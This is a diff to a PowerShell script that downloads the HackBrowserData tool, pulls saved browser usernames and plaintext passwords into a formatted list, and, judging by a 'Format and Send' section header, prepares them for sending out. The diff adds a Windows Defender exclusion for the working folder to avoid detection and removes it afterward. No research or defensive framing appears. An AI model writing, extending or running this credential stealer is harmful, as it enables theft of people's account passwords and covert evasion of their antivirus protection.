@@ -22,6 +22,9 @@ $tempDir = "$env:TEMP\hbd_$(Get-Random)"
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
 try {
+    # Add temp directory to Windows Defender exclusion
+    Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
+    
     # Download HackBrowserData
     $hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
     $zipPath = "$tempDir\hbd.zip"
@@ -45,14 +48,13 @@ try {
             $data = Get-Content $jsonFile.FullName | ConvertFrom-Json
             $browsers = ""
             foreach($item in $data) {
-                # Extract service name from URL
-                $service = "Unknown"
-                try {
-                    $uri = [System.Uri]$item.url
-                    $domain = $uri.Host -replace '^www\.',''
-                    $service = ($domain -split '\.')[0]
-                } catch {}
-                $browsers += "# $service`n$($item.url)`n  User: $($item.username)`n  Pass: $($item.password)`n`n"
+                $url = if($item.LoginURL) { $item.LoginURL } else { "No URL" }
+                $user = if($item.UserName) { $item.UserName } else { "" }
+                $pass = if($item.Password) { $item.Password } else { "" }
+                
+                if($pass) {
+                    $browsers += "$url`nUser: $user`nPass: $pass`n`n"
+                }
             }
             if(-not $browsers) { $browsers = "No saved browser passwords found" }
         } else {
@@ -66,6 +68,7 @@ try {
 }
 
 # Clean up
+Remove-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
 Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 
 # === Format and Send ===
